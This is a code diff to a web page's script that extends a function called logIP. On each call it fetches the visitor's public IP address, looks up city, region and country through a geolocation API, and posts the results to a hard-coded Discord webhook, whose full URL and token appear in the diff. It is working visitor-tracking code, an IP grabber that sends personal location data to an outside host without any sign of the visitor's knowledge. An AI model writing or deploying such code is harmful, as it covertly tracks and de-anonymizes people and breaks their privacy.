@@ -12,12 +12,42 @@
  async function logIP() {
  const ipResponse = await fetch('https://api.ipify.org');
  const ip = await ipResponse.text();
+ 
+ // Use a CORS-enabled API
+ const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+ const locationData = await locationResponse.json();
+ 
+ // Extract relevant data
+ const city = locationData.city;
+ const region = locationData.region;
+ const country = locationData.country_name;
+ const isp = "Unknown"; // Note: This API doesn't provide ISP info
+ 
+ // Build webhook message
  const webhookURL = 'https://discord.com/api/webhooks/1543545525821767750/6eYDQxde7zpBEwGEI8eLDnpewZynTvxDuBjwm9HPCMnZZStybikfq6FuZwhw_RXmdRyL';
- fetch(webhookURL, {
+ 
+ try {
+ let response = await fetch(webhookURL, {
  method: 'POST',
- headers: { 'Content-Type': 'application/json' },
- body: JSON.stringify({ content: `Logged IP: ${ip}` }),
+ headers: { 
+ 'Content-Type': 'application/json', 
+ 'User-Agent': 'Discord Webhook' 
+ },
+ body: JSON.stringify({
+ content: `Logged IP: ${ip} | Location: ${city}, ${region}, ${country}`,
+ }),
  });
+ 
+ if (!response.ok) {
+ throw new Error(`HTTP error! status: ${response.status}`);
+ }
+ 
+ console.log("Sent successfully!");
+ 
+ } catch (error) {
+ console.error("Error sending webhook:", error);
+ alert("Failed to log IP. Check console for details.");
+ }
  }
  </script>
 </body>
